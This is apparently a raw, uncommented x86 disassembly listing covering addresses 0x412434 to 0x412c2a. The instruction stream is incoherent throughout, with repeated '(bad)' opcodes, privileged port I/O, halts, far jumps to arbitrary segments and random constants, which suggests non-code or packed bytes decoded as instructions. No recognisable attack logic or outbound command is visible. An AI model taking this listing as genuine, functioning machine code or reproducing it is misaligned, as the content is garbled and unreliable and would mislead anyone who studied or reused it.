  412434:	lods   eax,DWORD PTR ds:[esi]
  412435:	in     al,0x4f
  412437:	mov    edx,0xeb549d62
  41243c:	push   edx
  41243d:	sar    ecx,cl
  41243f:	ins    BYTE PTR es:[edi],dx
  412440:	jns    0x41246d
  412442:	pop    ebx
  412443:	test   edi,eax
  412445:	sbb    DWORD PTR [esi],0xffffffb9
  412448:	loope  0x412453
  41244a:	add    dh,BYTE PTR [edi+eiz*2+0x28]
  41244e:	cdq    
  41244f:	jge    0x412420
  412451:	and    BYTE PTR [esi-0x55f8424a],al
  412457:	out    0xab,eax
  412459:	repz push 0x70
  41245c:	repz mov edi,0x31ca41c2
  412462:	(bad)  
  412463:	cli    
  412464:	dec    esp
  412465:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  412467:	scas   eax,DWORD PTR es:[edi]
  412468:	fisub  WORD PTR [eax-0x5d]
  41246b:	(bad)  
  41246c:	sbb    BYTE PTR [edi-0x73],al
  41246f:	popa   
  412470:	mov    ebp,0x9501c430
  412475:	pushf  
  412476:	pop    ebp
  412477:	enter  0x16a9,0xa9
  41247b:	cmp    bl,bh
  41247d:	add    esp,eax
  41247f:	(bad)  
  412480:	repz daa 
  412482:	xor    bl,BYTE PTR [ebx+0x16cae6db]
  412488:	and    DWORD PTR [ecx],esi
  41248a:	xchg   edi,eax
  41248b:	gs ds mov ch,0xab
  41248f:	add    DWORD PTR [esi-0x3e83b894],esi
  412495:	and    BYTE PTR [esi-0x7f],ah
  412498:	pop    es
  412499:	push   edx
  41249a:	pop    es
  41249b:	out    0x35,al
  41249d:	cld    
  41249e:	jno    0x4124f6
  4124a0:	shl    BYTE PTR [eax+eiz*4+0x4a3dc540],0x48
  4124a8:	outs   dx,DWORD PTR ds:[esi]
  4124a9:	xchg   edi,eax
  4124aa:	jb     0x41247b
  4124ac:	or     dh,BYTE PTR [ecx]
  4124ae:	dec    edi
  4124af:	sub    BYTE PTR [edx+0xf837c5c],bh
  4124b5:	aad    0xea
  4124b7:	out    dx,al
  4124b8:	xlat   BYTE PTR ds:[ebx]
  4124b9:	shl    BYTE PTR [ecx-0x156acaa],1
  4124bf:	das    
  4124c0:	in     eax,0x28
  4124c2:	sbb    BYTE PTR [esi+edi*1-0x1b5f7afc],bh
  4124c9:	jb     0x412515
  4124cb:	ss loope 0x4124f4
  4124ce:	out    0xfd,al
  4124d0:	jge    0x4124cf
  4124d2:	push   0xffffffed
  4124d4:	xchg   edi,eax
  4124d5:	xor    al,0x85
  4124d7:	mov    DWORD PTR [edx],eax
  4124d9:	out    dx,al
  4124da:	add    DWORD PTR [edi],esi
  4124dc:	mov    dl,0xfd
  4124de:	cmp    DWORD PTR [ecx],edx
  4124e0:	dec    ebx
  4124e1:	mov    edi,0x130b036f
  4124e6:	adc    al,0x99
  4124e8:	or     dl,dh
  4124ea:	push   esi
  4124eb:	cmp    DWORD PTR [edi+eiz*4-0x6f],ebp
  4124ef:	cdq    
  4124f0:	push   ebx
  4124f1:	xor    eax,0x81cb226b
  4124f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124f7:	test   eax,0xf715d72f
  4124fc:	call   0xe9cc:0x899a2f3e
  412503:	inc    esp
  412504:	leave  
  412505:	lea    esi,[edx+0x6b]
  412508:	sbb    ch,bh
  41250a:	ins    BYTE PTR es:[edi],dx
  41250b:	dec    edx
  41250c:	sbb    eax,0x62d5f8ab
  412511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412512:	test   eax,0x7227371b
  412517:	add    DWORD PTR [edi+0x5c555dee],esp
  41251d:	rcr    BYTE PTR [ebx],0xae
  412520:	(bad)  
  412521:	dec    eax
  412522:	nop
  412523:	push   edi
  412524:	push   ecx
  412525:	jg     0x4124b1
  412527:	test   DWORD PTR [esi+0x40],ecx
  41252a:	dec    DWORD PTR [ebx+0x6c]
  41252d:	popa   
  41252e:	pop    esp
  41252f:	pop    es
  412530:	jp     0x412559
  412532:	mov    ds:0x1af80db,al
  412537:	pop    ebp
  412538:	xor    al,0x33
  41253a:	lock adc BYTE PTR [ecx],dl
  41253d:	jns    0x4124c4
  41253f:	sahf   
  412540:	out    0xe2,al
  412542:	sub    eax,0x25fda744
  412547:	mov    ds:0x89deb494,eax
  41254c:	rol    DWORD PTR [ebp+0x228f4170],1
  412552:	es iret 
  412554:	and    al,0x46
  412556:	ins    DWORD PTR es:[edi],dx
  412557:	jg     0x412507
  412559:	pop    ds
  41255a:	or     ah,bh
  41255c:	gs sbb eax,0xdde62028
  412562:	sbb    ebp,ecx
  412564:	sar    BYTE PTR [edi+eax*4],0x89
  412568:	xchg   ebx,eax
  412569:	fsub   st,st(7)
  41256b:	push   cs
  41256c:	aad    0xc2
  41256e:	and    DWORD PTR [esi+eax*8],0xd9ad2f78
  412575:	inc    edi
  412576:	jp     0x412547
  412578:	or     DWORD PTR [eax+0x54],0x76
  41257c:	mov    ds:0xa861c341,al
  412581:	cdq    
  412582:	outs   dx,BYTE PTR ds:[esi]
  412583:	sbb    BYTE PTR [eax+0xe],0xa4
  412587:	test   DWORD PTR [edx+0x227fb8bd],edi
  41258d:	xchg   esi,eax
  41258e:	dec    ebx
  41258f:	xor    eax,0xbd15c53b
  412594:	in     eax,0x9b
  412596:	pop    ss
  412597:	jns    0x4125e7
  412599:	cwde   
  41259a:	scas   eax,DWORD PTR es:[edi]
  41259b:	sub    al,0x3
  41259d:	ss add edx,edi
  4125a0:	push   ds
  4125a1:	stc    
  4125a2:	out    0x6d,al
  4125a4:	popa   
  4125a5:	adc    eax,0x74df76b
  4125aa:	mov    es,WORD PTR [edi+0x7d807ddb]
  4125b0:	lods   eax,DWORD PTR ds:[esi]
  4125b1:	jo     0x412609
  4125b3:	push   0xb242c210
  4125b8:	mov    esi,0xf49dec0f
  4125bd:	mov    ds:0x6951608a,al
  4125c2:	pop    ecx
  4125c3:	popf   
  4125c4:	jnp    0x41263f
  4125c6:	hlt    
  4125c7:	out    dx,eax
  4125c8:	and    al,0x6d
  4125ca:	add    ebx,esp
  4125cc:	add    eax,0x78a3b40e
  4125d1:	test   al,0x57
  4125d3:	jne    0x41258a
  4125d5:	retf   
  4125d6:	ins    BYTE PTR es:[edi],dx
  4125d7:	dec    ebp
  4125d8:	xor    eax,0x2aa7d9de
  4125dd:	mov    edi,0x83064fd6
  4125e2:	icebp  
  4125e3:	jb     0x412572
  4125e5:	xchg   edx,eax
  4125e6:	push   ecx
  4125e7:	xor    BYTE PTR [edx-0x46],ch
  4125ea:	lock inc ebp
  4125ec:	std    
  4125ed:	nop
  4125ee:	jecxz  0x412617
  4125f0:	adc    al,0xa0
  4125f2:	dec    ebx
  4125f3:	aas    
  4125f4:	lods   al,BYTE PTR ds:[esi]
  4125f5:	xchg   esi,eax
  4125f6:	mov    cl,0xac
  4125f8:	sub    al,0x71
  4125fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125fb:	mov    al,ds:0xebf4a33d
  412600:	mov    al,ds:0x93d68dda
  412605:	dec    ebx
  412606:	dec    ebp
  412607:	(bad)  
  412608:	fistp  DWORD PTR [esp+eax*2]
  41260b:	pop    edx
  41260c:	pop    ss
  41260d:	xor    al,0x9d
  41260f:	(bad)  
  412610:	pushf  
  412611:	call   ebp
  412613:	arpl   WORD PTR [eax-0x12eb7a9c],bp
  412619:	mov    ebx,0x67347bcd
  41261e:	pop    ebp
  41261f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412620:	test   eax,ebp
  412622:	sbb    bh,BYTE PTR [edi-0x2b]
  412625:	lds    esp,FWORD PTR [edx-0x2854472c]
  41262b:	mov    bl,0xc4
  41262d:	mov    eax,0x6feef4dc
  412632:	dec    esi
  412633:	aas    
  412634:	adc    al,0xaa
  412636:	adc    al,0xcf
  412638:	or     eax,0xadfe150c
  41263d:	inc    esi
  41263e:	gs iret 
  412640:	pop    edx
  412641:	pusha  
  412642:	dec    ebp
  412643:	js     0x4126a9
  412645:	in     al,0x57
  412647:	arpl   WORD PTR [esi+0x77],si
  41264a:	pop    edx
  41264b:	pop    ds
  41264c:	int3   
  41264d:	or     BYTE PTR [edx+0x7204a709],bl
  412653:	jno    0x41265e
  412655:	mov    cl,0x49
  412657:	and    ax,0x4470
  41265b:	add    eax,0xef00aa9f
  412660:	(bad)
  412663:	fidiv  DWORD PTR [eax+eax*1-0x7f6d6b62]
  41266a:	or     DWORD PTR [edx],ebp
  41266c:	sub    ah,BYTE PTR [ebx]
  41266e:	sbb    BYTE PTR ds:0xa4d7c9b2,bl
  412674:	mov    ds:0x75098982,al
  412679:	mov    ds:0x197e140c,eax
  41267e:	adc    edi,DWORD PTR [edx]
  412680:	adc    al,0x8d
  412682:	arpl   WORD PTR [edi-0x704f2bae],sp
  412688:	adc    edx,DWORD PTR [edi+0x57f48342]
  41268e:	inc    esi
  41268f:	cmp    BYTE PTR [ebx-0xb],bh
  412692:	sub    esp,DWORD PTR [eax]
  412694:	outs   dx,BYTE PTR ds:[esi]
  412695:	dec    ebx
  412696:	pop    ds
  412697:	cmp    eax,0xb46e2c71
  41269c:	fsub   QWORD PTR [ebx+0x18]
  41269f:	fmulp  st(1),st
  4126a1:	fadd   DWORD PTR ds:0x4c1695e
  4126a7:	out    0xe,eax
  4126a9:	xchg   esi,eax
  4126aa:	icebp  
  4126ab:	pop    ds
  4126ac:	mov    BYTE PTR [eax+0xb],bh
  4126af:	and    edx,DWORD PTR [edx+edi*1-0x43c4d738]
  4126b6:	popa   
  4126b7:	dec    ebp
  4126b8:	int    0x38
  4126ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126bb:	jecxz  0x41264b
  4126bd:	addr16 and al,0x9d
  4126c0:	dec    ebp
  4126c1:	fbstp  TBYTE PTR [ebx]
  4126c3:	xor    al,0x10
  4126c5:	mov    ah,0x3e
  4126c7:	cmp    BYTE PTR [ebx-0x29473ef1],cl
  4126cd:	fnstenv [esi+eiz*1]
  4126d0:	fcmovne st,st(3)
  4126d2:	rcl    al,0x6f
  4126d5:	add    ah,BYTE PTR [esi-0x2f]
  4126d8:	loope  0x41274d
  4126da:	in     eax,0x96
  4126dc:	cld    
  4126dd:	mov    al,0x44
  4126df:	jmp    DWORD PTR ds:[ebp-0x2575425]
  4126e7:	push   esi
  4126e8:	inc    esp
  4126e9:	test   eax,0x3edfc46f
  4126ee:	(bad)  
  4126ef:	mov    ebx,DWORD PTR [esi-0x51]
  4126f2:	xadd   DWORD PTR [esi-0x46],eax
  4126f6:	or     BYTE PTR [ebp-0x4e],cl
  4126f9:	fwait
  4126fa:	jno    0x412737
  4126fc:	fdivr  QWORD PTR [ebx+0xde9d360]
  412703:	dec    eax
  412704:	dec    ebp
  412705:	stos   DWORD PTR es:[edi],eax
  412706:	xchg   edx,eax
  412707:	push   ebx
  412708:	and    BYTE PTR [ecx],cl
  41270a:	or     eax,0x75ae5189
  41270f:	neg    BYTE PTR [ebx+0x290089b8]
  412715:	aam    0x72
  412717:	dec    edx
  412718:	jl     0x412762
  41271a:	fisub  WORD PTR [edx+ebx*2]
  41271d:	adc    BYTE PTR [eax+0x11],dh
  412720:	pop    ebx
  412721:	xchg   edx,eax
  412722:	mov    ah,BYTE PTR [ecx+edi*1-0x846896d]
  412729:	inc    ecx
  41272a:	xor    BYTE PTR [eax-0x58b01a41],bh
  412730:	sub    al,0x1d
  412732:	mov    WORD PTR [edx+eax*2-0x507808d7],?
  412739:	mov    dl,0xc0
  41273b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41273c:	retf   
  41273d:	push   ebx
  41273e:	xor    BYTE PTR ds:0x57ed2db0,dl
  412744:	(bad)
  412747:	popa   
  412748:	arpl   WORD PTR [ebx-0x464b44d1],ax
  41274e:	adc    al,0x1a
  412750:	outs   dx,BYTE PTR ds:[esi]
  412751:	and    ebx,edi
  412753:	push   0xc96cf86b
  412758:	sbb    eax,0xdd106a35
  41275d:	xchg   esi,eax
  41275e:	(bad)  
  41275f:	jmp    0xffdf4016
  412764:	push   ss
  412765:	adc    al,0xc1
  412767:	and    BYTE PTR [ebp-0x266ca0a4],cl
  41276d:	enter  0x8b55,0x60
  412771:	jp     0xd5849f87
  412777:	data16 cmp cl,ch
  41277a:	mov    eax,0x30b5666
  41277f:	loopne 0x4127d6
  412781:	call   0x7c28:0x6c444115
  412788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412789:	popf   
  41278a:	shr    BYTE PTR [ecx+0x4c44bfb8],0x11
  412791:	int3   
  412792:	and    eax,0xaff3e482
  412797:	mov    edi,0xfc1cadf2
  41279c:	lods   eax,DWORD PTR ds:[esi]
  41279d:	fadd   DWORD PTR [ebx+edx*2]
  4127a0:	test   ebx,esp
  4127a2:	into   
  4127a3:	imul   edx,DWORD PTR [eax],0x5e
  4127a6:	dec    esp
  4127a7:	mov    esi,0x6f2cf4e6
  4127ac:	xor    dh,BYTE PTR [ecx]
  4127ae:	neg    DWORD PTR [edi]
  4127b0:	scas   al,BYTE PTR es:[edi]
  4127b1:	scas   al,BYTE PTR es:[edi]
  4127b2:	jmp    FWORD PTR [eax+0x14]
  4127b5:	out    dx,al
  4127b6:	imul   eax,DWORD PTR [eax],0x5c814690
  4127bc:	adc    BYTE PTR [edi-0x5c5e9446],cl
  4127c2:	clc    
  4127c3:	and    DWORD PTR [ebp-0x7c42c815],ebx
  4127c9:	test   ch,0xe
  4127cc:	fsubr  DWORD PTR [ebp+0x368e8ee0]
  4127d2:	lahf   
  4127d3:	inc    DWORD PTR [ecx+0x54]
  4127d6:	test   al,0xb
  4127d8:	cmovnp edi,DWORD PTR [ecx-0x5c]
  4127dc:	aad    0xf
  4127de:	push   esi
  4127df:	jmp    0xbed2:0xfba44449
  4127e6:	cmp    DWORD PTR [esp+ebp*4-0x427d8e0b],esp
  4127ed:	mov    ebx,DWORD PTR [edx+0x1c]
  4127f0:	adc    eax,0x76c4a13b
  4127f5:	and    BYTE PTR [eax+edx*8-0x37],dl
  4127f9:	inc    esp
  4127fa:	scas   eax,DWORD PTR es:[edi]
  4127fb:	test   bh,dh
  4127fd:	stc    
  4127fe:	test   BYTE PTR [edi-0x14],bh
  412801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412802:	mov    esi,0x5756f44d
  412807:	jg     0x412819
  412809:	mov    ch,BYTE PTR [esi+eax*4-0x7c22673f]
  412810:	ret    0xdc89
  412813:	dec    BYTE PTR [edi]
  412815:	aam    0xd8
  412817:	adc    DWORD PTR [edx+0x34],edx
  41281a:	pop    esp
  41281b:	jbe    0x412832
  41281d:	mov    DWORD PTR [eax+eiz*2+0x494da0c8],edx
  412824:	fldenv [ecx-0xf]
  412827:	pop    edi
  412828:	retf   0xfc23
  41282b:	add    BYTE PTR [edi],dh
  41282d:	das    
  41282e:	jg     0x412825
  412830:	sar    DWORD PTR [ecx+0x36],cl
  412833:	mov    ebp,0x40f4d2a9
  412838:	lock daa 
  41283a:	nop
  41283b:	pop    eax
  41283c:	add    eax,0xb78242d9
  412841:	cs push edx
  412843:	sbb    cl,BYTE PTR [edx+esi*4-0x2c08e862]
  41284a:	int3   
  41284b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41284c:	cmp    ebx,eax
  41284e:	xchg   ebp,eax
  41284f:	jo     0x412806
  412851:	lds    edx,FWORD PTR [eax-0x4f608a9a]
  412857:	arpl   si,di
  412859:	add    al,BYTE PTR [edx+0x5d]
  41285c:	cmp    al,0xcb
  41285e:	out    dx,eax
  41285f:	cmp    BYTE PTR [ecx],ch
  412861:	jns    0x4128ae
  412863:	mov    edx,0xd0fe0fb8
  412868:	lock pop ebp
  41286a:	mov    esi,0xe2d6ccf4
  41286f:	or     edi,DWORD PTR [eax]
  412871:	cld    
  412872:	es cdq 
  412874:	push   edi
  412875:	or     bh,BYTE PTR [ebp+0x6a85592a]
  41287b:	cmp    al,0x22
  41287d:	frstor [edi-0x7dc08fa]
  412883:	lahf   
  412884:	cmp    eax,0x9c77b362
  412889:	repnz not DWORD PTR [esp+ebx*4-0x119aade3]
  412891:	cmp    al,cl
  412893:	jno    0x412876
  412895:	lock push edi
  412897:	addr16 mov cl,0xe7
  41289a:	(bad)  
  41289b:	xchg   ebp,eax
  41289c:	hlt    
  41289d:	jne    0x4128b7
  41289f:	loope  0x412844
  4128a1:	sbb    esi,DWORD PTR [esi]
  4128a3:	jmp    0x412863
  4128a5:	or     ch,BYTE PTR [ebx-0x63]
  4128a8:	and    al,0xd2
  4128aa:	pop    eax
  4128ab:	(bad)  
  4128ac:	mov    al,ds:0xf9a56149
  4128b1:	inc    esi
  4128b2:	sub    al,0x89
  4128b4:	inc    ebx
  4128b5:	push   0xfefc036a
  4128ba:	call   0xffb68d0e
  4128bf:	push   cs
  4128c0:	sti    
  4128c1:	cmp    ebp,edx
  4128c3:	ins    DWORD PTR es:[edi],dx
  4128c4:	sbb    al,0x4e
  4128c6:	jno    0x41288a
  4128c8:	aas    
  4128c9:	daa    
  4128ca:	jb     0x4128fb
  4128cc:	mov    esi,0x5eede1fa
  4128d1:	lea    edi,[ebp+0x3d]
  4128d4:	lds    ebx,FWORD PTR [eax-0x6f]
  4128d7:	jecxz  0x412903
  4128d9:	mov    ah,0xc0
  4128db:	and    esi,DWORD PTR ss:[ebx-0x39]
  4128df:	push   esp
  4128e0:	sbb    edi,DWORD PTR [esi+esi*8+0x73]
  4128e4:	ror    DWORD PTR [esi-0xc],cl
  4128e7:	neg    BYTE PTR [edi+eax*4]
  4128ea:	out    dx,al
  4128eb:	xchg   esp,eax
  4128ec:	lods   al,BYTE PTR ds:[esi]
  4128ed:	je     0x4128a9
  4128ef:	dec    edi
  4128f0:	add    DWORD PTR [eax+eax*8+0x54],esi
  4128f4:	xchg   BYTE PTR ds:0x5a541038,dh
  4128fa:	xchg   esi,eax
  4128fb:	mov    al,ds:0xa509e1a2
  412900:	in     eax,dx
  412901:	call   0x710a8f19
  412906:	pop    edx
  412907:	cwde   
  412908:	pop    ecx
  412909:	xchg   edx,eax
  41290a:	xchg   edx,eax
  41290b:	add    al,ch
  41290d:	and    al,0xb8
  41290f:	inc    edx
  412910:	dec    ebx
  412911:	push   ecx
  412912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412913:	or     ebp,ebp
  412915:	mov    ah,0xd7
  412917:	jl     0x4128bb
  412919:	mov    ecx,0xf921aa0a
  41291e:	or     BYTE PTR [ecx+edx*4],0x76
  412922:	jbe    0x41297e
  412924:	dec    edi
  412925:	cwde   
  412926:	dec    ebx
  412927:	ror    BYTE PTR [ebp-0x327b6047],cl
  41292d:	and    edx,esi
  41292f:	and    ebx,eax
  412931:	lock jns 0x412901
  412934:	add    BYTE PTR [eax],ah
  412936:	push   ebp
  412937:	jl     0x4129b2
  412939:	xchg   ebx,eax
  41293a:	add    bl,BYTE PTR [ebp-0x55]
  41293d:	xor    DWORD PTR [ebp-0x2b686e27],edi
  412943:	lods   eax,DWORD PTR ds:[esi]
  412944:	adc    edx,eax
  412946:	ror    DWORD PTR [eax+0x68],cl
  412949:	mov    WORD PTR [edx-0xe52554f],gs
  41294f:	(bad)  
  412951:	test   DWORD PTR [ebx+0x75fa2c23],esi
  412957:	mov    ecx,0xb8bc3bc2
  41295c:	dec    ecx
  41295d:	jg     0x412991
  41295f:	cmp    eax,0xf869fefb
  412964:	mov    ebx,0x4e1cd5bc
  412969:	adc    cl,BYTE PTR [eax]
  41296b:	(bad)  
  41296c:	int    0x29
  41296e:	mov    dh,0x1f
  412970:	push   ss
  412971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412972:	int3   
  412973:	jmp    0x412923
  412975:	jo     0x41292a
  412977:	sub    al,0x56
  412979:	sbb    edi,DWORD PTR [esi+0x2b]
  41297c:	sbb    bh,BYTE PTR [eax+0x1743edfe]
  412982:	push   ebp
  412983:	cli    
  412984:	adc    esi,DWORD PTR [edi]
  412986:	out    0xc3,al
  412988:	pop    eax
  412989:	gs mov dh,0xa2
  41298c:	dec    ebp
  41298d:	jl     0x41294e
  41298f:	mov    BYTE PTR [esp+edi*2-0x376deade],dl
  412996:	adc    BYTE PTR [ebp-0x5a],cl
  412999:	loope  0x41299e
  41299b:	jg     0x412a13
  41299d:	rcr    DWORD PTR [ebx-0xf9f89c],cl
  4129a3:	or     BYTE PTR [eax-0x973f282],cl
  4129a9:	add    al,0x40
  4129ab:	sbb    eax,0x18b38f66
  4129b0:	jns    0x4129a3
  4129b2:	lods   al,BYTE PTR ds:[esi]
  4129b3:	pop    edx
  4129b4:	retf   0xaba8
  4129b7:	test   BYTE PTR [eax+0x7d5da7a0],bh
  4129bd:	dec    ebx
  4129be:	add    al,0x9b
  4129c0:	add    eax,0xe015341b
  4129c5:	push   eax
  4129c6:	std    
  4129c7:	or     dh,BYTE PTR [ebp-0x7]
  4129ca:	sahf   
  4129cb:	repz aaa 
  4129cd:	js     0x4129b4
  4129cf:	mov    esp,0xa91690df
  4129d4:	jbe    0x4129ce
  4129d6:	ja     0x412a3e
  4129d8:	or     cl,BYTE PTR [edx+esi*1+0x5c]
  4129dc:	mov    esp,esp
  4129de:	cwde   
  4129df:	std    
  4129e0:	mov    esp,0xba4afaad
  4129e5:	mov    edi,DWORD PTR [ebx]
  4129e7:	ins    BYTE PTR es:[edi],dx
  4129e8:	in     eax,dx
  4129e9:	add    esp,DWORD PTR [eax]
  4129eb:	shl    DWORD PTR [edx-0x6a],0xe8
  4129ef:	jno    0x4129cb
  4129f1:	cdq    
  4129f2:	adc    BYTE PTR [eax-0x24],al
  4129f5:	pop    esi
  4129f6:	adc    DWORD PTR [ebx+0x6c],0x5a4ceff7
  4129fd:	mov    bl,0x25
  4129ff:	mov    bh,0x3
  412a01:	jmp    esp
  412a03:	pop    ebx
  412a04:	adc    BYTE PTR ds:0x91ec7244,ah
  412a0a:	push   ecx
  412a0b:	ds fsubr st,st(5)
  412a0e:	loope  0x412a1e
  412a10:	lds    ebp,FWORD PTR [esp+edx*4]
  412a13:	xor    eax,0x117049c3
  412a18:	clc    
  412a19:	idiv   BYTE PTR fs:[esi+ecx*8+0x5de52f23]
  412a21:	bound  ecx,QWORD PTR [eax-0xa5cdfaf]
  412a27:	call   0x6cae2a27
  412a2c:	mov    ebp,0xae3e4361
  412a31:	shl    BYTE PTR [ebp-0x73],cl
  412a34:	sub    al,BYTE PTR [ecx-0x4899cc46]
  412a3a:	imul   esp,DWORD PTR [edi-0x19],0xffffff8d
  412a3e:	dec    esp
  412a3f:	in     al,dx
  412a40:	pop    edi
  412a41:	lock mov eax,ds:0xd9e6dfdc
  412a47:	setl   BYTE PTR [edi-0x55]
  412a4b:	pop    ebp
  412a4c:	retf   0x30ed
  412a4f:	jmp    0x2ff3b5b8
  412a54:	xchg   ecx,eax
  412a55:	push   ebx
  412a56:	out    0x19,eax
  412a58:	dec    eax
  412a59:	and    BYTE PTR [edx],cl
  412a5b:	inc    ebx
  412a5c:	arpl   si,sp
  412a5e:	add    dl,BYTE PTR [edx-0x1]
  412a61:	(bad)  
  412a62:	dec    ebx
  412a63:	sbb    ch,BYTE PTR [ecx+0x2f9fa2b6]
  412a69:	scas   al,BYTE PTR es:[edi]
  412a6a:	push   esi
  412a6b:	bound  esi,QWORD PTR [edi+edi*4+0x37]
  412a6f:	jne    0x412ad1
  412a71:	loope  0x412a54
  412a73:	jae    0x412a1c
  412a75:	mov    al,ds:0x8850f255
  412a7a:	aam    0xbc
  412a7c:	add    ecx,DWORD PTR [edx-0x72959a88]
  412a82:	mov    eax,ds:0x1be53414
  412a87:	inc    ebx
  412a88:	out    0xa7,al
  412a8a:	ret    0x8bcb
  412a8d:	and    BYTE PTR [eax],bh
  412a8f:	sub    eax,0xe5bd3eb2
  412a94:	stc    
  412a95:	fwait
  412a96:	and    eax,0xafdc10df
  412a9b:	dec    edi
  412a9c:	gs xchg esi,eax
  412a9e:	repnz and eax,0x44270562
  412aa4:	push   esp
  412aa5:	inc    ecx
  412aa6:	dec    esp
  412aa7:	mov    gs,edx
  412aa9:	and    cl,al
  412aab:	(bad)  
  412aac:	lods   al,BYTE PTR ds:[esi]
  412aad:	cmp    eax,0x6ba83480
  412ab2:	xchg   ecx,eax
  412ab3:	mov    ebx,0xb5c60e3f
  412ab8:	in     al,dx
  412ab9:	shr    BYTE PTR [ebx+0x669ab52d],cl
  412abf:	int    0x93
  412ac1:	pop    ecx
  412ac2:	add    eax,0x560723e5
  412ac7:	aas    
  412ac8:	out    0x3,eax
  412aca:	ret    
  412acb:	inc    esi
  412acc:	into   
  412acd:	xor    DWORD PTR [esp+ebx*8-0x1c],ebx
  412ad1:	mov    BYTE PTR [eax],ch
  412ad3:	jg     0x412a5e
  412ad5:	sbb    eax,0xa95bc12
  412ada:	loop   0x412ad0
  412adc:	pop    esp
  412add:	sbb    dh,BYTE PTR [edi-0x3ede46fe]
  412ae3:	call   0x52a9:0x31c9faa
  412aea:	loopne 0x412a9f
  412aec:	cdq    
  412aed:	lods   al,BYTE PTR ds:[esi]
  412aee:	rol    DWORD PTR [ecx-0x69532b25],cl
  412af4:	push   ecx
  412af5:	fyl2xp1 
  412af7:	push   ecx
  412af8:	rcr    BYTE PTR ds:0x33dec7de,1
  412afe:	xor    ebp,DWORD PTR [eax]
  412b00:	popf   
  412b01:	loopne 0x412ab3
  412b03:	ja     0x412aa6
  412b05:	imul   BYTE PTR [ecx]
  412b07:	ror    BYTE PTR [eax+0x20],0xea
  412b0b:	mov    esp,0x5f87eead
  412b10:	pusha  
  412b11:	xor    eax,0xa938368f
  412b16:	inc    edi
  412b17:	fild   DWORD PTR [edi+0x3b]
  412b1a:	stos   BYTE PTR es:[edi],al
  412b1b:	arpl   WORD PTR [eax],bx
  412b1d:	loop   0x412aec
  412b1f:	jmp    DWORD PTR [ebx+0x16]
  412b22:	ins    BYTE PTR es:[edi],dx
  412b23:	(bad)  
  412b24:	fs push edi
  412b26:	retf   0xaba8
  412b29:	jmp    0x316d9e98
  412b2e:	hlt    
  412b2f:	ins    BYTE PTR es:[edi],dx
  412b30:	xor    DWORD PTR [ebx+eiz*1],0xcc59aa3b
  412b37:	in     eax,dx
  412b38:	xor    cl,BYTE PTR gs:[esi+eax*1-0x55]
  412b3d:	ret    
  412b3e:	stos   DWORD PTR es:[edi],eax
  412b3f:	ds or  eax,0x1046c61a
  412b45:	adc    ebx,DWORD PTR [edi-0x6]
  412b48:	out    dx,al
  412b49:	dec    ebp
  412b4a:	push   0x1f
  412b4c:	hlt    
  412b4d:	mov    ds:0xe3c6a424,eax
  412b52:	(bad)  
  412b54:	addr16 out dx,al
  412b56:	mov    dh,0xf0
  412b58:	and    ch,BYTE PTR es:[ecx-0x861dbfe]
  412b5f:	(bad)  
  412b60:	mov    dh,0xea
  412b62:	mov    ds:0xd774aacb,eax
  412b67:	(bad)  
  412b68:	daa    
  412b69:	lea    edi,[ebx+0x19]
  412b6c:	mov    bl,0x91
  412b6e:	jns    0x412b64
  412b70:	pop    ds
  412b71:	xor    BYTE PTR [ecx+0x6],al
  412b74:	add    al,0xf6
  412b76:	or     BYTE PTR [esi],al
  412b78:	cmp    eax,0x4095c6c2
  412b7d:	std    
  412b7e:	or     eax,0x45e02a8
  412b83:	inc    esi
  412b84:	in     eax,0x83
  412b86:	in     al,dx
  412b87:	adc    DWORD PTR [edi+0x70cad4a2],ecx
  412b8d:	pop    edx
  412b8e:	leave  
  412b8f:	xchg   DWORD PTR [esp+edi*1-0x5e37f4c3],edi
  412b96:	cdq    
  412b97:	jmp    0x13a6:0x3220d0ac
  412b9e:	mov    edx,ds
  412ba0:	data16 mov BYTE PTR [ebp-0x4f],dh
  412ba4:	jns    0x412b80
  412ba6:	ins    BYTE PTR es:[edi],dx
  412ba7:	xor    eax,0xd37a5cc6
  412bac:	and    bh,BYTE PTR [edi+ecx*8-0x3cab03f2]
  412bb3:	mov    eax,0x7b8268d
  412bb8:	mov    bh,0xc0
  412bba:	inc    edx
  412bbb:	add    bh,BYTE PTR [esi+0x7c]
  412bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bbf:	fsubr  QWORD PTR [ebx-0x6916f324]
  412bc5:	jmp    0x5807862b
  412bca:	pusha  
  412bcb:	call   0x6f92:0xea01a2f4
  412bd2:	mov    eax,ds:0x5d912879
  412bd7:	in     al,dx
  412bd8:	xchg   esi,eax
  412bd9:	dec    edx
  412bda:	in     eax,0xdd
  412bdc:	xchg   edx,eax
  412bdd:	add    DWORD PTR [esi+0x79ae095d],0xffffffd8
  412be4:	xchg   ebp,eax
  412be5:	xchg   al,ah
  412be7:	inc    edx
  412be8:	int3   
  412be9:	ds clc 
  412beb:	sar    esp,1
  412bed:	rcr    BYTE PTR [ebx-0x45],0x91
  412bf1:	(bad)  
  412bf2:	shl    BYTE PTR [ebx],cl
  412bf4:	fbld   TBYTE PTR [eax-0x1b]
  412bf7:	retf   
  412bf8:	mov    eax,0x7f418ace
  412bfd:	out    dx,al
  412bfe:	jno    0x412c69
  412c00:	push   es
  412c01:	sbb    DWORD PTR [esi-0x12],edi
  412c04:	aad    0xe
  412c06:	repnz inc edx
  412c08:	les    ecx,FWORD PTR [eax+0x2f3451d3]
  412c0e:	repz pop edi
  412c10:	pop    ebp
  412c11:	pop    edi
  412c12:	mov    ecx,es
  412c14:	lods   al,BYTE PTR ds:[esi]
  412c15:	inc    ecx
  412c16:	frstor [eax+eax*1]
  412c19:	mov    bh,0xcf
  412c1b:	enter  0xf7c5,0xdf
  412c1f:	jp     0x412bfc
  412c21:	les    ecx,FWORD PTR [esi+0x75dc777f]
  412c27:	fstp   QWORD PTR [edi]
  412c29:	pop    eax
  412c2a:	inc    ebx
